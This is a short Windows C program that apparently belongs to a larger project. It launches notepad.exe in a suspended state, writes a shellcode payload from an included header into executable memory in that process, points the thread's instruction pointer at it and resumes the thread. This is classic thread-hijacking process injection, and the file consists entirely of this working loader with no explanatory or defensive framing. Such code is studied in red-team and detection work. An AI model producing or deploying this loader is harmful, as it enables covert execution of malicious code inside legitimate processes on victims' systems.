#include <windows.h>
#include <stdio.h>
#include "../common/payload.h"

int main() {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // Create target process in suspended state
    if (!CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 1;
    }

    // Allocate memory in target for shellcode
    LPVOID pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteCode) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Write shellcode to target process
    if (!WriteProcessMemory(pi.hProcess, pRemoteCode, payload, payload_len, NULL)) {
        VirtualFreeEx(pi.hProcess, pRemoteCode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Get thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        VirtualFreeEx(pi.hProcess, pRemoteCode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Hijack instruction pointer
#ifdef _WIN64
    ctx.Rip = (DWORD64)pRemoteCode;
#else
    ctx.Eip = (DWORD)pRemoteCode;
#endif

    // Set modified context and resume thread
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    WaitForSingleObject(pi.hThread, 3000);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
